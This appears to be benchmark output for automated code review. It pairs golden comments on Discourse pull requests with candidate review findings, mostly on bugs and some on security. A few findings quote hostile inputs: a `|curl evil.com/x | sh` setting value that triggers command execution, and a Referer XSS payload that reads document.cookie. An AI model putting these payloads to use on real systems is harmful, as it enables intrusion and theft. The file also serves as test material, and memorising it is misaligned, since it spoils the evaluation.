true_positives.golden_comment: The downsize method is defined twice. The second definition, which expects a single dimensions string parameter, overrides the first, which expected separate max_width and max_height parameters. This makes the original method unreachable and breaks existing code that calls it with separate width and height arguments.
true_positives.matched_candidate:
Second `self.downsize` definition silently overwrites the 4-argument one

`self.downsize(from, to, max_width, max_height, opts={})` (line 145) is immediately redefined by `self.downsize(from, to, dimensions, opts={})` (line 149). In Ruby the later definition wins, so the 4-arg form is dead code and every existing caller that passes width and height separately (e.g. `OptimizedImage.downsize(path, path, w, h)`) now either raises `ArgumentError` (5 args) or passes the height Integer as `opts`, which then blows up with `TypeError: no implicit conversion of Symbol into Integer` inside `downsize_instructions` when evaluating `opts[:force_aspect_ratio]`. If both forms are needed, use a single method that accepts either a dimension string or width/height, and update all call sites.

true_positives.golden_comment: Hardcoding maxSizeKB = 10 * 1024 ignores Discourse.SiteSettings['max_' + type + '_size_kb'], so the client-side limit can diverge from server-side and per-type settings (also applies to the 413 handler below).
true_positives.matched_candidate:
Client-side size limit hardcoded to 10MB, ignoring max_attachment_size_kb / max_image_size_kb

`validateUploadedFile` previously used `Discourse.SiteSettings['max_' + type + '_size_kb']`; it now hardcodes 10240 KB for every type. Non-image attachments are not downsized server-side, so a site configured with a smaller `max_attachment_size_kb` will let users pick files that the server then rejects (and the `file_too_large` alert quotes 10240 KB, a number the admin never configured). Conversely, sites with a larger configured limit now have uploads blocked in the browser. The `type` argument is also no longer used for the size check. Keep using the site setting for attachments, and only bypass it for images that the server will downsize.

true_positives.golden_comment: Passing 80% as the dimensions can fail for animated GIFs when allow_animated_thumbnails is true, since the animated path uses gifsicle --resize-fit which expects WxH geometry, not a percentage; downsizing would then silently fail.
true_positives.matched_candidate:
Percentage dimension is invalid for the animated-GIF (gifsicle) code path

With `SiteSetting.allow_animated_thumbnails` enabled and a `.gif` upload, `optimize` dispatches to `downsize_instructions_animated`, which builds `gifsicle <from> --colors=256 --resize-fit 80% --optimize=3 --output <to>`. `--resize-fit` only accepts pixel geometry (`WxH`, `_xH`, ...), not a percentage, so gifsicle exits with an error; because input and output are the same path the GIF may also be clobbered. Use `--scale 0.8` for gifsicle, or compute explicit pixel dimensions before calling downsize.

true_positives.golden_comment: The loop checking `tempfile.size` may never terminate correctly due to stale cached size, leading to potential infinite loops or incorrect file handling after modifications.
true_positives.matched_candidate:
Loop re-reads size from a Tempfile handle whose file was rewritten by an external process

The loop condition and the later `Upload.create_for(..., tempfile.size, ...)` read size through the still-open `Tempfile` object after an external binary rewrote `tempfile.path`. If the tool writes a new file and renames it over the path (gifsicle does this, and some ImageMagick delegates do too), the open descriptor still refers to the unlinked original inode, so `tempfile.size` returns the stale (large) size: the loop keeps re-converting for all 5 attempts and the recorded filesize can disagree with the stored bytes. Re-open/stat the path (`File.size(tempfile.path)`) after each conversion instead of trusting the cached handle.

false_positives.candidate:
413 error message hardcodes 10MB instead of the configured limit

In `displayErrorForUpload`, the HTTP 413 branch now reports `10 * 1024` KB regardless of the site's `max_image_size_kb`/`max_attachment_size_kb` or the web server's `client_max_body_size`. Users on sites with a different limit get a misleading maximum size in the alert.

API URL download limit hardcoded to 10MB for all upload types

`FileHelper.download(url, 10.megabytes, ...)` replaces the `SiteSetting.max_image_size_kb`-derived limit. This applies to every `type`, including attachments which are never downsized afterwards, so an API user can make the server fetch and buffer up to 10MB per request even when the administrator configured a much smaller maximum. Derive the cap from the relevant site setting (with an explicit, bounded allowance for images that will be downsized).

In-place downsize can destroy the uploaded file and the failure result is ignored

`OptimizedImage.downsize(tempfile.path, tempfile.path, "80%", ...)` uses the same path for input and output, so ImageMagick/gifsicle truncates and rewrites the only copy of the user's upload. `convert_with` swallows errors (`rescue` -> `false`) and this return value is not checked, so a failed or partially written conversion leaves a truncated/empty file that is then handed to `Upload.create_for`, producing a corrupt upload instead of an error. Write to a separate temp file and only swap it in when the conversion reports success; abort the loop as soon as `downsize` returns false.

No tests for the new auto-downsize behaviour or the changed downsize signature

The PR adds a size-reduction loop in `create_upload` and changes `OptimizedImage.downsize`/`optimize` signatures, but no specs are added or updated. There is no coverage for: an oversized image being reduced below `max_image_size_kb`, an image still too large after 5 attempts, a non-image skipping the loop, or the new `downsize(from, to, dimensions)` form. Existing specs calling `OptimizedImage.downsize(from, to, w, h)` or `OptimizedImage.dimensions` (now removed) would also fail silently unnoticed without updates.

Up to five full ImageMagick + ImageOptim passes run inline per upload

Each loop iteration shells out to `convert` and then `ImageOptim.new.optimize_image!` (inside `convert_with`), so a single large upload can trigger five full re-encodes plus five lossless-optimizer runs while occupying a request/Defer worker. For multi-megabyte images this is seconds to minutes of CPU per upload and is trivially triggerable by any logged-in user. Compute the target scale from the current/desired byte ratio so one or two passes suffice, and skip the ImageOptim pass for intermediate iterations.

true_positives.golden_comment: The EmbeddableHost model's before_validation callback calls self.host.sub! to strip http://, https://, and path segments, but if self.host is nil, this raises NoMethodError.
true_positives.matched_candidate:
before_validation raises NoMethodError when host is nil

`self.host.sub!(/^https?:\/\//, '')` is executed in a `before_validation` callback without a nil check. `Admin::EmbeddableHostsController#save_host` assigns `host.host = params[:embeddable_host][:host]`, which is `nil` when the client omits/blanks the field, and `EmbeddableHost.new.valid?` is also legitimate. In that case `nil.sub!` raises NoMethodError and the request returns a 500 instead of the intended `validates_format_of` validation error. Guard the callback (e.g. `return if host.blank?`) and add `validates_presence_of :host`.

true_positives.golden_comment: The update and destroy methods in Admin::EmbeddableHostsController do not validate the existence of the EmbeddableHost record retrieved by ID. If EmbeddableHost.where(id: params[:id]).first returns nil (i.e., the host does not exist), attempting to call methods on the nil object (e.g., save_host or destroy) will result in a NoMethodError.
true_positives.matched_candidate:
update/destroy dereference nil when the id does not exist

`EmbeddableHost.where(id: params[:id]).first` returns `nil` for an unknown or already-deleted id. `update` then calls `save_host(nil)` which hits `nil.host=` and `destroy` (line 16) calls `nil.destroy`, both raising NoMethodError and producing a 500 instead of a 404. This is easy to trigger from the admin UI by deleting the same host twice (or from two browser tabs). Use `find_by`/`find` with an explicit `raise Discourse::NotFound` or `render json: ... , status: 404`.

true_positives.golden_comment: record_for_host compares lower(host) = ? but does not normalize the parameter’s case, so mixed‑case referer hosts may fail to match even though comparison intends to be case‑insensitive.
true_positives.matched_candidate:
Host lookup is case-sensitive on the parameter side

`where("lower(host) = ?", host)` lowercases the stored column but not the value extracted from the request: `URI("http://Example.com").host` returns `Example.com` with its original case. Hostnames are case-insensitive, so a referer such as `http://Example.com/page` (or a stored host entered with capitals) will not match any row, and `host_allowed?` returns false — `EmbedController#ensure_embeddable` then raises `Discourse::InvalidAccess` and `TopicRetriever` refuses to fetch, silently breaking embedding. Downcase the argument: `where("lower(host) = ?", host.downcase)`.

true_positives.golden_comment: Because this migration inserts embeddable_hosts rows with raw SQL, any existing embeddable_hosts values that include http:// or /https:// or path segments won’t go through the EmbeddableHost model’s normalization, so the new host lookup (which compares only the bare host) may fail for migrated data. Consider ensuring that migrated hosts are normalized to the same format as newly created EmbeddableHost records so existing embedding configurations keep working.
true_positives.matched_candidate:
Migration copies host values verbatim, so hosts that included a scheme stop matching

The old `embeddable_hosts` site setting explicitly allowed entries such as `http://discourse.org` (the old `SiteSetting.allows_embeddable_host?` stripped the scheme at comparison time, and the removed specs covered exactly that). This migration inserts each line directly with `INSERT INTO embeddable_hosts (host, ...) VALUES ('#{h}', ...)`, bypassing the model's `before_validation` that strips `https?://` and paths. `EmbeddableHost.record_for_host` then compares `lower(host)` against `URI(...).host` (a bare hostname), so a migrated row `http://discourse.org` can never match and embedding/topic retrieval silently breaks for those sites. Because line 31 deletes the `embeddable_hosts` setting, the original data is also gone and cannot be re-migrated. Normalize the value (strip scheme/path, downcase) before inserting.

true_positives.golden_comment: The contents of `category_fabricator.rb` and `embeddable_host_fabricator.rb` have been swapped, resulting in the loss of original category fabricators and potentially causing errors in fabricator usage.
true_positives.matched_candidate:
Fabricator file contents swapped

`spec/fabricators/category_fabricator.rb` now contains only the `:embeddable_host` fabricator while the new `spec/fabricators/embeddable_host_fabricator.rb` contains the `:category`, `:diff_category`, `:happy_category` and `:private_category` fabricators. The two file bodies were clearly exchanged; this works only because Fabrication loads every file in the directory, and it makes the category fabricators impossible to find by filename. Swap the contents back.

true_positives.golden_comment: The SQL query in the `app/controllers/admin/embeddable_hosts_controller.rb` file uses string interpolation (`'#{h}'`) to insert values, which is vulnerable to SQL injection. It should use parameter binding or proper quoting to prevent this security vulnerability.
true_positives.matched_candidate:
Host value interpolated into SQL without quoting

`execute "INSERT INTO embeddable_hosts (host, ...) VALUES ('#{h}', ...)"` interpolates an admin-supplied site-setting value straight into SQL. A value containing a single quote (or any SQL metacharacter) produces a syntax error and aborts the migration mid-way — after the table was created and before the old settings are deleted — leaving the site in an inconsistent state. Use `ActiveRecord::Base.connection.quote(h)` or a parameterized `execute`/model insert.

true_positives.golden_comment: The migration accesses execute(...)[0]['id'] without checking if the query returned any rows, which causes a crash when no embed_category setting exists. This can lead to a broken feature when attempting to edit category/host relationships.
true_positives.matched_candidate:
Migration raises NoMethodError when the old settings rows are absent

`execute("SELECT c.id FROM categories AS c INNER JOIN site_settings AS s ON s.value = c.name WHERE s.name = 'embed_category'")[0]['id']` assumes the query always returns at least one row. On any site where `embed_category` was never set (the default was `''`, so no `site_settings` row exists at all) or where its value no longer matches a category name, the result set is empty and `[0]` is `nil`, so `nil['id']` raises NoMethodError and the whole migration aborts. The same problem exists on line 15: `uncategorized_category_id` defaults to `-1` and is normally not persisted in `site_settings`, so that fallback query also returns zero rows and crashes. Both lookups need to handle an empty result (and the resulting `category_id` must be a real category, since the column is `null: false` and `-1` points at nothing).

false_positives.candidate:
/fruits/:id handler ignores the requested id, making the new assertions vacuous

The handler always returns `fruits[0]` (apple, `color_ids: [1,2]`) regardless of `request.params.id`. The updated store test now calls `store.find('fruit', 2)` and asserts `colors` are ids 1 and 2, but fruit 2 (banana) has `color_ids: [3]` — the test passes only because the wrong record is served. The test therefore does not verify that the right record's `*_ids` are hydrated. Make the handler look the fruit up by id (`fruits.findBy('id', parseInt(request.params.id))`) so the assertions mean what they claim.

New admin endpoints have no behavioural tests

The only assertion in this spec (and in spec/controllers/admin/embedding_controller_spec.rb) is that the class inherits from `Admin::AdminController`. Nothing exercises `create`, `update`, `destroy`, the uncategorized-category fallback, the staff/admin constraint, or the JSON shape of `GET /admin/customize/embedding`. As a result none of the new code paths are covered — including the serialization of the `OpenStruct` built in `fetch_embedding` (a non-ActiveModel object handed to `EmbeddingSerializer`) and the nil-record handling in update/destroy. Add request specs that create/update/delete a host and assert the rendered payload.

No uniqueness validation or index on host

Nothing prevents two rows with the same `host` (the migration creates no unique index and the model has no `validates_uniqueness_of :host`). `record_for_host` takes `.first` of the match, so when duplicates exist the category used for newly imported embedded topics is whichever row the database happens to return — a non-deterministic result that is confusing to debug. The column is also queried on every embed request with `lower(host) = ?` and has no index. Add a (case-insensitive) unique index plus a model validation.

Only the first underscore is dasherized when matching ADMIN_MODELS

`type.replace('_', '-')` replaces a single occurrence, so a type with two or more underscores (e.g. `site_customization_thing`) becomes `site-customization_thing` and will not match its dasherized entry in `ADMIN_MODELS`, silently routing the request to `/` instead of `/admin/` and returning 404/403. Use a global replacement (`type.replace(/_/g, '-')`) or `Ember.String.dasherize(type)`.

PUT /admin/customize/embedding is a no-op that reports success

`update` only re-renders the freshly fetched `@embedding` OpenStruct; it never reads params or persists anything, yet it returns 200 with the serialized object. The admin controller action `saveChanges` (app/assets/javascripts/admin/controllers/admin-embedding.js.es6) calls `this.get('embedding').update({})` against this endpoint, so any future caller believes a save succeeded when nothing was written. Either implement the update or remove the route, the action and the controller method so no caller depends on a fake success.

Plural embedded ids are dropped even when they cannot be resolved

The new `m[2]` branch unconditionally does `obj[pluralize(subType)] = obj[k].map(id => this._lookupSubType(...))` and then `delete obj[k]`. Unlike the singular branch (which keeps the `_id` key when hydration fails), this destroys the original ids: if the sub-collection is not side-loaded in the payload, the model ends up with an array of `undefined` values and the `*_ids` property is gone, so callers can neither use the objects nor fall back to the ids. It also assumes the value is an array — any REST-serialized attribute whose name happens to end in `_ids` but holds a string/number will throw `obj[k].map is not a function` and break hydration of the whole record. Only replace the key when every lookup succeeded (and guard with `Array.isArray`).

Test named "is false if embeddable_host is blank" no longer tests that

`expandable_first_post?` no longer consults embeddable hosts at all (the check was removed from app/models/topic.rb), so this example passes merely because `SiteSetting.embed_truncate` defaults to false and `has_topic_embed?` is false for a built topic. The name claims coverage that does not exist and will mislead anyone debugging embedding. Either delete it or rename it to describe what it actually asserts.

create_table with force: true in a migration can drop an existing table

`create_table :embeddable_hosts, force: true` issues a `DROP TABLE IF EXISTS` first. If the table already exists (e.g. this migration is re-run after a partial failure, or a multisite tenant already has the table), all existing embeddable host rows are destroyed without warning. Additionally, because `change` contains `execute` statements, the migration is not reversible and `rake db:rollback` will fail; use explicit `up`/`down` methods and drop `force: true`.

has_many embed: :ids does not side-load the hosts the client needs

With ActiveModel::Serializers 0.8 (the version this codebase uses), `has_many :embeddable_hosts, embed: :ids` emits only `embeddable_host_ids`; the host objects are side-loaded into the root payload only when `include: true`/`embed_in_root: true` is also given. The Ember store resolves plural foreign keys in `_hydrateEmbedded` by looking up `root[pluralize(subType)]` (i.e. a root-level `embeddable_hosts` array) — see the matching test fixture that returns `{__rest_serializer: "1", fruits, farmers, colors}`. Without the side-loaded array every id resolves to `undefined`, so `embedding.embeddable_hosts` becomes an array of `undefined` and the admin table renders empty/broken rows. Add `include: true` (or `embed: :objects`) and a controller spec asserting the JSON contains the hosts.

true_positives.golden_comment: logic: Potential nil pointer exception - if no TopicUser record exists, tu will be nil and calling methods on it will crash
true_positives.matched_candidate:
unsubscribe crashes with NoMethodError when no TopicUser row exists

`TopicsController#unsubscribe` does `tu = TopicUser.find_by(user_id: current_user.id, topic_id: params[:topic_id])` and then immediately dereferences `tu.notification_level` without a nil check. A `topic_users` row is not guaranteed to exist for the current user and topic (e.g. the link is shared/forwarded and opened by a different logged-in user, the row was removed, or the user simply visits `/t/<slug>/<id>/unsubscribe` for a topic they have never interacted with). In those cases the request raises `NoMethodError` on nil and returns a 500 instead of a useful page. The action should create/fetch the record (e.g. via `TopicUser.change`) or handle nil gracefully.

true_positives.golden_comment: Typo in property name: 'stopNotificiationsText' should be 'stopNotificationsText' (missing 'n' in 'Notifications')
true_positives.matched_candidate:
Misspelled property name stopNotificiationsText

The computed property is named `stopNotificiationsText` ("Notificiations") in both the controller and `templates/topic/unsubscribe.hbs`. It works today because the typo is consistent, but it is a trap for future edits/overrides (a correctly spelled reference in a plugin or theme will silently render nothing). Rename to `stopNotificationsText` in both places.

false_positives.candidate:
Class attribute contains a stray leading dot

`<h4 class='.previous-discussion'>` sets the literal class name `.previous-discussion`, so any email stylesheet rule targeting `.previous-discussion` will never match. Since this line is being reformatted in this PR anyway, drop the leading dot.

No tests for the new unsubscribe endpoint or unsubscribe_url rendering

The only test change is adding `unsubscribe_url` to an existing builder so the suite keeps passing. There is no spec asserting that the per-topic unsubscribe URL actually appears in the email body/HTML, no spec for `Topic#unsubscribe_url`, and no controller spec for `TopicsController#unsubscribe`. Given the nil-`TopicUser` crash, the non-idempotent toggle and the GET-based mutation, a controller spec covering (a) no existing topic_users row, (b) repeated requests, and (c) the slug redirect is needed to prevent regressions.

State-changing unsubscribe exposed over GET with no CSRF protection The new `unsubscribe` action mutates the user's `topic_users.notification_level` and is wired to GET routes (`get "t/:slug/:topic_id/unsubscribe"`, `get "t/:topic_id/unsubscribe"`) with `skip_before_filter :check_xhr`. Rails does not CSRF-protect GET requests, so any third-party page can silently change a logged-in user's notification level for an arbitrary topic with ``, and repeated loads will escalate the level to `muted` (see the toggle logic). Browser prefetching/link scanners and a plain page refresh have the same effect. Side effects should be performed behind a POST/PUT (or a signed unsubscribe key, like `email/unsubscribe/:key`) rather than a plain GET.

Unsubscribe is not idempotent: reloading the page escalates to muted

The logic is `if tu.notification_level > regular then regular else muted`. A watching/tracking user who opens the unsubscribe link gets `regular`; if the same URL is hit again (page refresh, back/forward navigation, browser or mail-client prefetch, or the user clicking the link in a second email) the level is now equal to `regular`, so the else branch sets `muted`. A single user action ("unsubscribe from this topic") can therefore silently escalate to full muting of the topic without any further confirmation. The endpoint should be idempotent, i.e. set a single deterministic target level.

Unsubscribe page claims notifications will stop even when level is only lowered to 'regular' The page always renders `topic.unsubscribe.stop_notifications` ("You will stop receiving notifications for {{title}}."), but the server only sets the level to `regular` when the user was watching/tracking. At `regular` the user still receives notifications for replies to their posts, quotes and mentions in that topic, so the message is factually wrong for the most common case. The same applies to the new `unsubscribe_link` server string ("To stop receiving notifications about this particular topic, click here"). The text should reflect the level that was actually applied.

Writing notification_level directly bypasses TopicUser.change bookkeeping

The action assigns `tu.notification_level` and calls `tu.save!` instead of going through `TopicUser.change`. As a result `notifications_reason_id` and `notifications_changed_at` are never set, and no MessageBus `/topic/<id>` `notification_level_change` message is published. Two concrete consequences: (1) other open tabs/clients keep showing the stale notification level; (2) `TopicUser.update_last_read` only auto-bumps the level to `tracking` when `notifications_reason_id IS NULL`, so after this unsubscribe the next time the user reads the topic long enough their level is silently raised back to `tracking`, undoing the unsubscribe.

unsubscribe_link translation now requires %{unsubscribe_url} with no fallback

The `unsubscribe_link` string gained a `%{unsubscribe_url}` interpolation, but `Email::MessageBuilder` adds no default for `unsubscribe_url` in `@template_args`. Any caller that passes `add_unsubscribe_link: true` without also passing `unsubscribe_url` (other mailers, forks, plugins) will now raise `I18n::MissingInterpolationArgument` in `MessageBuilder#body`/`#html_part`, i.e. the email fails to send. The fact that `spec/components/email/message_builder_spec.rb` had to be changed to add `unsubscribe_url` confirms the hard dependency. Add a default (e.g. fall back to `user_preferences_url`) or only append the per-topic sentence when the option is present.

true_positives.golden_comment: BlockedEmail.should_block_email? method has side effects during a read operation - it updates statistics even when just checking if an email should be blocked. This could cause race conditions in concurrent environments and makes the method name misleading.
true_positives.matched_candidate:
Non-atomic read-modify-write of match_count loses increments and writes during validation

`should_block?` loads the record, does `record.match_count += 1` in Ruby and then `record.save`. Two concurrent signups using the same blocked address read the same `match_count` and both write the same incremented value, so increments are silently lost. It also issues an UPDATE of the whole row (including `updated_at`) from inside a read-only predicate. Use an atomic SQL update (e.g. `BlockedEmail.where(id: record.id).update_all("match_count = match_count + 1, last_match_at = ...")` or `increment!`) so the statistic is correct under concurrency.

true_positives.golden_comment: The case-sensitive email lookup in `BlockedEmail.should_block?` creates a bypass risk, allowing 'User@Example.com' to bypass a block on 'user@example.com'. This can lead to unauthorized access to blocked users.
true_positives.matched_candidate:
Blocked-email lookup is exact/case-sensitive, so the block is trivially bypassed

`BlockedEmail.where(email: email).first` performs an exact string comparison. Nothing in this model (or in `User.new_from_params`, which assigns `params[:email]` verbatim) normalizes case or strips whitespace, and the unique index added in the migration is on the raw column. An admin blocking `spammer@example.com` will not block a signup with `Spammer@Example.com`, and blocking `Spammer@Example.com` will not block the lowercase form. Downcase/strip the email both when persisting a BlockedEmail and when looking it up (consistent with `Email.downcase` used elsewhere).

false_negatives.golden_comment: The regex pattern @(#{domains}) in email_in_restriction_setting? method only matches domain suffixes, not full domains with proper boundary anchoring. An attacker can register evil.example.com to bypass a whitelist entry for example.com.

false_positives.candidate:
Any email error from the server is reported to the user as "invalid"

Every server-side email error (already-taken address, domain whitelist/blacklist rejection, blocked email) causes the email to be pushed into `rejectedEmails`, and `emailValidation` then renders the generic `user.email.invalid` reason. The actual server message (which is only shown transiently in the flash) is discarded, so users retyping the form see a misleading "invalid email" message for reasons such as "email already registered". Consider storing the server reason alongside the rejected email and displaying it.

No coverage for the whitelist/blacklist logic moved out of User, nor for the model wiring

The whitelist/blacklist validation was moved from `User#email_validator` into this new `EmailValidator`, but the only specs added stub `BlockedEmail.should_block?` and exercise the blocked branch. There is no test for `email_domains_whitelist`/`email_domains_blacklist` behaviour in its new home, no test that an existing error on `:email` short-circuits the blocked check (the `record.errors[attribute].blank?` guard), and no test that `User` actually rejects a blocked email end-to-end via `validates :email, email: true`. A regression in the moved code or in the model wiring would go unnoticed.

Validator performs a database write, so match statistics are double counted and can be rolled back

`BlockedEmail.should_block?` mutates and saves the BlockedEmail row, and it is invoked from `validate_each`. `UsersController#create` calls `user.valid?` (for the Discourse Hub check) and then `user.save`, so validation runs twice for a single signup attempt and `match_count` is incremented twice. Worse, the increment that happens during `save` runs inside the user's save transaction, so it is rolled back if the insert fails, while the increment from the earlier `valid?` persists — making the counter and `last_match_at` unreliable. Move the side effect out of validation (e.g. record the match in the controller/flow after the check) or make the counter update happen outside the AR transaction.

rejectedEmails array is declared on the class and shared/never reset

`rejectedEmails: Em.A([])` puts a single mutable array on the controller's prototype, so every instance of `CreateAccountController` shares the same array object and `pushObject` mutates shared state. In addition the list is never cleared, so an email rejected once stays flagged as invalid for the lifetime of the page even if the server-side reason no longer applies (e.g. the whitelist setting changed, or the user corrects an unrelated field and retries). Initialize it per-instance (in `init`) and clear it when the modal is opened.

true_positives.golden_comment: The PollFeed job calls open(SiteSetting.feed_polling_url) without validating the URL, allowing an attacker who controls the feed_polling_url site setting to make the server fetch arbitrary internal or external URLs.
true_positives.matched_candidate:
Kernel#open on a site-setting URL allows command execution and has no timeouts

`SimpleRSS.parse open(SiteSetting.feed_polling_url)` uses `Kernel#open` with open-uri semantics: a value beginning with `|` (e.g. `|curl evil.com/x | sh`) is executed as a shell command, so an admin-editable (and, in multisite setups, potentially less-trusted) site setting becomes remote command execution in the Sidekiq process. There is also no read/open timeout or size limit, so a slow or huge feed can hang the worker indefinitely. Validate the scheme (http/https only) and fetch with `URI.parse(...).open` / a real HTTP client with timeouts.

true_positives.golden_comment: The current origin validation using indexOf is insufficient and can be bypassed. An attacker could use a malicious domain like evil-discourseUrl.com to pass this check.
true_positives.matched_candidate:
postMessage origin check uses substring matching instead of comparing origins

`if (discourseUrl.indexOf(e.origin) === -1) { return; }` accepts any `event.origin` that happens to be a substring of the configured `discourseUrl` (and would silently accept everything if `discourseUrl` were ever empty). Derive the expected origin from `discourseUrl` (scheme + host + optional port) and compare it with `e.origin` for strict equality, so only the forum frame can resize the iframe.

true_positives.golden_comment: The ERB block closes with end if, which is invalid Ruby/ERB and will raise at render; it should just be end to close the if block.
true_positives.matched_candidate:
`<%- end if %>` produces a stray modifier-if that breaks the header block

Line 6 emits the Ruby code `end if` instead of `end`. The compiled template therefore becomes `if ... else ... end if <next generated statement>`, i.e. the whole if/else expression turns into a modifier-if whose condition is the following generated line (the logo `link_to` append). Depending on the ERB compiler this either raises a syntax error when the template is compiled (500 on every embed request) or silently reorders the output so the logo is appended before the button. Change it to `<%- end %>`.

true_positives.golden_comment: Calling `i.content.scrub` assumes that `i.content` is always populated. However, many RSS feeds do not provide a `content` field, leading to a potential nil pointer exception when `i.content` is nil. A fallback to `description` should be implemented to prevent crashes.
true_positives.matched_candidate:
`i.content` is nil for RSS 2.0 feeds, raising NoMethodError and killing the job

`content = CGI.unescapeHTML(i.content.scrub)` assumes every feed item exposes a `content` field. SimpleRSS returns nil for keys that are absent, and RSS 2.0 items carry the body in `description` (Atom uses `content`/`summary`). For a plain RSS feed this raises `NoMethodError: undefined method 'scrub' for nil`. Because the job is declared `sidekiq_options retry: false`, the whole hourly poll aborts on the first such item and nothing is imported, with no fallback. Fall back to `i.description`/`i.summary` and skip items with blank content.

true_positives.golden_comment: An unescaped request header (request.referer) is interpolated into JavaScript without proper escaping, which can lead to XSS vulnerabilities if the referer contains malicious content. This issue can allow attackers to execute arbitrary scripts in the context of the application.
true_positives.matched_candidate:
Unescaped request.referer interpolated into inline JavaScript (XSS)

The embed layout writes `parent.postMessage({...}, '<%= request.referer %>')`, injecting the raw `Referer` request header into a single-quoted JS string literal with no escaping (no `j`/`escape_javascript`, and ERB's HTML escaping does not help inside a JS string). The only validation performed is `EmbedController#ensure_embeddable`, which checks the *host* of the referer; the path, query and fragment are free-form and may legally contain `'`, so an attacker who can get a victim to load `embed/best` with a crafted Referer (e.g. `http://<embeddable_host>/#'+alert(document.cookie)+'`) gets script execution in the forum's origin. Escape with `escape_javascript` (or, better, compute and emit only the scheme+host origin).

false_negatives.golden_comment: postMessage targetOrigin should be the origin (scheme+host+port), not the full referrer URL; using the full URL will cause the message to be dropped and prevent resizing.

The code sets X-Frame-Options: ALLOWALL which completely disables clickjacking protection. The referer validation can be bypassed (referer headers are easily spoofed), and the fallback to empty string for nil referer masks validation failures.

The TopicEmbed.import method is susceptible to a NoMethodError if the contents parameter is nil when attempting to append a string, and an XSS vulnerability due to unescaped url interpolation in the generated HTML.

false_positives.candidate:
"is 404 without an embed_url" does not exercise the missing-parameter path

`embeddable_host` defaults to `''`, so `ensure_embeddable` raises `Discourse::InvalidAccess` before the action (and thus before `params.require(:embed_url)`) ever runs. The example passes for the wrong reason and gives no coverage of the missing-parameter behaviour; it also asserts only `should_not be_success` rather than the claimed 404. Stub `embeddable_host` and a matching referer, then assert the actual status returned for a missing `embed_url`.

Anonymous requests can trigger unbounded remote fetches and topic creation for arbitrary URLs

`best` enqueues `Jobs::RetrieveTopic` for any `embed_url` whose host matches `embeddable_host`, with no authentication required. `TopicRetriever` only throttles per exact URL (60s), so a client can iterate over arbitrary paths/query strings on the embeddable host (`?x=1`, `?x=2`, ...) and cause the forum to (a) create an unbounded number of redis throttle keys, (b) issue an unbounded number of outbound HTTP fetches, and (c) create a new topic/post per distinct URL, including for 404/garbage pages. A global rate limit (per IP and/or per site) and a check that the retrieved page is a real article are needed.

Feed HTML stored as raw_html and rendered unescaped (stored XSS)

Feed item bodies are run through `CGI.unescapeHTML` (turning `<script>` back into real tags) and handed to `TopicEmbed.import`, which creates the post with `cook_method: Post.cook_methods[:raw_html]`. `Post#cook` then returns `raw` verbatim (app/models/post.rb:133) and the embed view renders it with `<%= raw post.cooked %>` (app/views/embed/best.html.erb:19), as does the normal topic view. No sanitization step exists anywhere in this path, so any script/iframe/onerror payload in a polled RSS/Atom feed (or in a compromised/hijacked feed URL) becomes stored XSS for every forum visitor. The raw HTML should be sanitized (e.g. via `Sanitize`/the existing allowed-tag whitelist) before being stored as `raw_html`.

Negative PollFeed specs pass vacuously

`feed_polling_enabled` defaults to false (config/site_settings.yml), so the "requires feed_polling_url" and "requires embed_by_username" examples would pass even if those two conditions were removed from `execute` — the first condition already short-circuits. Each example should stub the other settings to valid values so that only the condition under test is false. Note also that `poll_feed` itself (feed parsing, url fallback, content handling) has no test coverage at all.

New embed assets are not added to the asset precompile list

The layout references `stylesheet_link_tag 'embed'` and the new `app/assets/javascripts/embed.js` is meant to be served to third-party sites, but neither asset is added to `config.assets.precompile` (no change to config/application.rb or an initializer in this PR). Discourse precompiles an explicit whitelist, so in production `embed.css` / `embed.js` will not exist and every `embed/best` request will raise `Sprockets::Rails::Helper::AssetNotPrecompiled` / 500. Add both files to the precompile list.

Only the Rails 4 lockfile was regenerated for the new gems

`ruby-readability` and `simple-rss` are added unconditionally to the Gemfile, but only `Gemfile_rails4.lock` is updated. The Gemfile explicitly supports dual-booting (RAILS3 / RAILS_MASTER) with separate lockfiles, so booting in those modes will hit an out-of-sync lockfile and require a `bundle install` (or fail in deployment/frozen mode). Regenerate the other lockfiles as part of this change.

`force: true` added to an already-committed migration can drop a populated table

This migration existed before the PR and has already run on deployed installs; adding `force: true` has no effect there, but it makes the migration destructive if it is ever re-run (e.g. after a `rake db:migrate:redo`, a rollback/re-apply, or a schema reload), because `create_table ... force: true` issues a `DROP TABLE top_topics` first and silently discards the existing rows. The same pattern is used for the new `topic_embeds` table (db/migrate/20131217174004_create_topic_embeds.rb:3). `force: true` should not be used in migrations.

`post.present?` does not mean the post was saved; can violate NOT NULL on topic_embeds

`PostCreator#create` returns the (possibly unsaved) `@post` object even when validation fails — `save_post` raises `ActiveRecord::Rollback`, which inside this nested `Topic.transaction` block is swallowed rather than rolling back. `post.present?` is therefore true for an unsaved record, and `TopicEmbed.create!(topic_id: post.topic_id, post_id: post.id, ...)` runs with nil ids, violating the `null: false` constraints added in 20131217174004 and raising a StatementInvalid out of the job. Check `post.try(:persisted?)` / `creator.errors.blank?` instead.

absolutize_urls mangles protocol-relative URLs and ignores path-relative ones

The check `href.start_with?('/')` also matches protocol-relative URLs such as `//cdn.example.com/x.png`; `sub(/^\/+/, '')` then strips both slashes producing `http://feedhost/cdn.example.com/x.png`, i.e. a broken link/image for every protocol-relative asset in a feed (very common for CDN-hosted images). Conversely, truly relative references (`images/x.png`, `../x`) are left untouched and will resolve against the Discourse host. Resolving with `URI.join(url, href)` handles all of these cases correctly.

import mutates the caller's `contents` string

`contents << "\n<hr>..."` appends the attribution footer in place, so the caller's string object is modified as a side effect (e.g. the `content` local in PollFeed, or anything a plugin/thor task passes in). If a frozen or shared string is passed the call raises `RuntimeError: can't modify frozen String`, and repeated calls with the same object accumulate footers. Use `contents = contents + "..."` / `+=`.

import_remote calls open() without requiring open-uri

`open(url).read` relies on open-uri being loaded, but topic_embed.rb only requires nokogiri; the `require 'open-uri'` lives in app/jobs/scheduled/poll_feed.rb. When `import_remote` is reached via `Jobs::RetrieveTopic` -> `TopicRetriever` (neither of which loads poll_feed or open-uri), `open` is plain `Kernel#open` and an http URL fails with `Errno::ENOENT`. Add `require 'open-uri'` to this file (and prefer `URI.parse(url).open` so a `|command` string can never be executed).

setnx followed by a separate expire can leave a permanent throttle key

`$redis.setnx(key, "1")` and `$redis.expire(key, 60)` are two round trips; if the process dies (or redis fails) between them, the key is left with no TTL and `retrieved_recently?` returns true forever, permanently blocking retrieval of that embed URL for non-staff users. Use a single atomic `SET key 1 NX EX 60`.

true_positives.golden_comment: -ms-align-items never existed in any version of IE/Edge; the correct legacy property is -ms-flex-align.
true_positives.matched_candidate:
